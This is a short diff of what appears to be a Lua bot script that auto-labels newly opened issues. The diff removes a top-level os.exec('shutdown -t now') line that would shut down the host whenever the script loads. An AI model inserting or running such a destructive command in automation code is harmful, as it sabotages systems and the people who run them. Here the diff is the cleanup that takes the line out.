@@ -1,7 +1,4 @@
 -- Auto label on issue open
-
-os.exec('shutdown -t now')
-
 on('IssueEvent', function (e)
   if(e.action == 'opened') then
     local l = {}
